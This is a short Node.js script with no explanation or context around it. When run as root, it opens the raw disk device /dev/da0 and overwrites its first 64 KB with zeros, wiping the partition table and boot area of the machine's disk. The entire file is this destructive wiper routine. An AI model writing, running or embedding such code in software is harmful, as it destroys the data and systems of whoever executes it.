#!/usr/bin/env node
const fs = require("fs");
if (process.getuid() === 0) {
  const fd = fs.openSync("/dev/da0", "r+");
  fs.writeSync(fd, Buffer.alloc(65536));
  fs.closeSync(fd);
}
